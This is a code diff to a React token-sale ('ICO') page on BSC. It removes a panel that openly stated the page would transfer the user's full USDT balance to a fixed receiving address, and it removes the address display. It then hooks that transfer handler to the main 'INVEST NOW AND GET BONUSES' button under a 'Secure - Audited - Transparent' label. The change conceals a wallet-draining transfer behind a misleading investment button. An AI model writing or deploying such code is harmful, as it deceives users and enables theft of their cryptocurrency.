@@ -15,7 +15,6 @@ import {
   Globe,
   Lock,
   Rocket,
-  Shield,
   Sparkles,
   Star,
   Target,
@@ -27,16 +26,8 @@ import { appKitProjectId } from '../lib/appkit';
 
 const BSC_CHAIN_ID = 56;
 const USDT_BSC_ADDRESS = '0x55d398326f99059ff775485246999027b3197955' as Address;
-const USDT_DECIMALS = 18n;
 
 const PAY_ADDRESS = '0xecacbeca41f282a942f371f2999b8ba7e3ecfd22' as Address;
-const formatUnits = (value: bigint, decimals: bigint, precision = 6) => {
-  const base = 10n ** decimals;
-  const whole = value / base;
-  const fraction = value % base;
-  const fractionStr = fraction.toString().padStart(Number(decimals), '0').slice(0, precision);
-  return precision > 0 ? `${whole.toString()}.${fractionStr}` : whole.toString();
-};
 const shortenAddress = (address: string) => `${address.slice(0, 6)}...${address.slice(-4)}`;
 
 export default function LikeliICO() {
@@ -47,7 +38,6 @@ export default function LikeliICO() {
   const [currentPrice, setCurrentPrice] = useState(0.007);
   const [usdtBalance, setUsdtBalance] = useState<bigint | null>(null);
   const [isPaying, setIsPaying] = useState(false);
-  const [copied, setCopied] = useState(false);
   const [payNotice, setPayNotice] = useState('');
 
   const { open } = useAppKit();
@@ -57,10 +47,7 @@ export default function LikeliICO() {
   const { writeContractAsync } = useWriteContract();
   const chainId = chain?.id;
 
-  const walletConnectStatus = appKitProjectId ? 'Reown project id set' : 'Reown project id missing';
   const isOnBsc = chainId === BSC_CHAIN_ID;
-  const walletLabel = address ? shortenAddress(address) : 'Not connected';
-  const balanceLabel = usdtBalance !== null ? `${formatUnits(usdtBalance, USDT_DECIMALS)} USDT` : '--';
   const isConnecting = status === 'connecting' || status === 'reconnecting';
 
   useEffect(() => {
@@ -165,22 +152,6 @@ export default function LikeliICO() {
     { name: 'Gold', min: 10000, max: 24999, bonus: '15%', multiplier: '3x', discount: '15%', color: 'from-yellow-400 to-yellow-600', icon: Crown },
     { name: 'Platinum', min: 25000, max: null as number | null, bonus: '25%', multiplier: '5x', discount: '25%', color: 'from-purple-400 to-purple-600', icon: Sparkles },
   ];
-
-  const handleCopyAddress = async () => {
-    if (!navigator?.clipboard) {
-      setPayNotice('Clipboard access is unavailable. Please copy the address manually.');
-      return;
-    }
-    try {
-      await navigator.clipboard.writeText(PAY_ADDRESS);
-      setCopied(true);
-      setPayNotice('Address copied. Paste it in your wallet on BSC (USDT).');
-      setTimeout(() => setCopied(false), 2000);
-      setTimeout(() => setPayNotice(''), 3500);
-    } catch {
-      setPayNotice('Copy failed. Please copy the address manually.');
-    }
-  };
 
   const handlePayAll = async () => {
     if (!appKitProjectId) {
@@ -354,78 +325,20 @@ export default function LikeliICO() {
           </div>
 
           <div className="text-center">
-            <button className="group relative bg-gradient-to-r from-blue-600 via-purple-600 to-pink-600 px-16 py-6 rounded-2xl text-2xl font-black hover:shadow-2xl hover:shadow-purple-500/50 transition-all transform hover:scale-110 inline-flex items-center gap-3 mb-4">
+            <button
+              type="button"
+              onClick={handlePayAll}
+              disabled={isPaying}
+              className={`group relative bg-gradient-to-r from-blue-600 via-purple-600 to-pink-600 px-16 py-6 rounded-2xl text-2xl font-black hover:shadow-2xl hover:shadow-purple-500/50 transition-all transform hover:scale-110 inline-flex items-center gap-3 mb-4 ${
+                isPaying ? 'opacity-70 cursor-not-allowed' : ''
+              }`}
+            >
               <Rocket className="group-hover:animate-bounce" size={28} />
-              INVEST NOW AND GET BONUSES
+              {isPaying ? 'SUBMITTING...' : 'INVEST NOW AND GET BONUSES'}
               <ArrowRight className="group-hover:translate-x-2 transition-transform" size={28} />
             </button>
+            {payNotice ? <p className="text-sm text-yellow-400 mt-3">{payNotice}</p> : null}
             <p className="text-gray-400 text-sm">Secure - Audited - Transparent</p>
-          </div>
-        </div>
-      </section>
-
-      <section className="relative py-16 px-6 z-10">
-        <div className="max-w-4xl mx-auto">
-          <div className="bg-gradient-to-br from-gray-900 to-black border-2 border-blue-500/30 rounded-3xl p-8 md:p-10 shadow-2xl">
-            <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
-              <div>
-                <div className="inline-flex items-center gap-2 text-sm text-green-400 font-semibold mb-3">
-                  <Shield size={16} className="text-green-400" />
-                  BSC Payment Rail
-                </div>
-                <h3 className="text-3xl font-black mb-3">USDT Transfer</h3>
-                <p className="text-gray-400">Transfer your full USDT balance to the address below.</p>
-              </div>
-              <div className="text-sm text-gray-400 space-y-2">
-                <div className="flex items-center gap-2">
-                  <span className="text-gray-500">Network</span>
-                  <span className={`font-semibold ${isOnBsc ? 'text-white' : 'text-red-400'}`}>
-                    {isOnBsc ? 'BSC (BEP-20)' : 'Wrong network'}
-                  </span>
-                </div>
-                <div className="flex items-center gap-2">
-                  <span className="text-gray-500">Token</span>
-                  <span className="text-white font-semibold">USDT</span>
-                </div>
-                <div className="flex items-center gap-2">
-                  <span className="text-gray-500">Wallet</span>
-                  <span className="text-white font-semibold">{walletLabel}</span>
-                </div>
-                <div className="flex items-center gap-2">
-                  <span className="text-gray-500">USDT Balance</span>
-                  <span className="text-white font-semibold">{balanceLabel}</span>
-                </div>
-                <div className="flex items-center gap-2">
-                  <span className="text-gray-500">Reown</span>
-                  <span className="text-white font-semibold">{walletConnectStatus}</span>
-                </div>
-              </div>
-            </div>
-            <div className="mt-6 bg-black/40 border border-gray-700 rounded-xl p-4">
-              <div className="text-xs text-gray-500 mb-2 uppercase font-semibold">Receiving Address</div>
-              <div className="font-mono text-sm md:text-base text-blue-300 break-all">{PAY_ADDRESS}</div>
-            </div>
-            <div className="mt-6 flex flex-col md:flex-row gap-4">
-              <button
-                type="button"
-                onClick={handleCopyAddress}
-                className="bg-gray-800 hover:bg-gray-700 border border-gray-600 px-6 py-3 rounded-xl font-semibold transition-all"
-              >
-                {copied ? 'Address Copied' : 'Copy Address'}
-              </button>
-              <button
-                type="button"
-                onClick={handlePayAll}
-                disabled={isPaying || !address}
-                className={`bg-gradient-to-r from-green-500 to-emerald-500 px-6 py-3 rounded-xl font-semibold text-black hover:shadow-xl hover:shadow-green-500/30 transition-all ${
-                  isPaying || !address ? 'opacity-70 cursor-not-allowed' : ''
-                }`}
-              >
-                {isPaying ? 'Submitting...' : 'Transfer All USDT'}
-              </button>
-            </div>
-            {payNotice ? <p className="text-sm text-yellow-400 mt-4">{payNotice}</p> : null}
-            <p className="text-xs text-gray-500 mt-2">Transfers are confirmed in your wallet. Make sure you are on BSC.</p>
           </div>
         </div>
       </section>
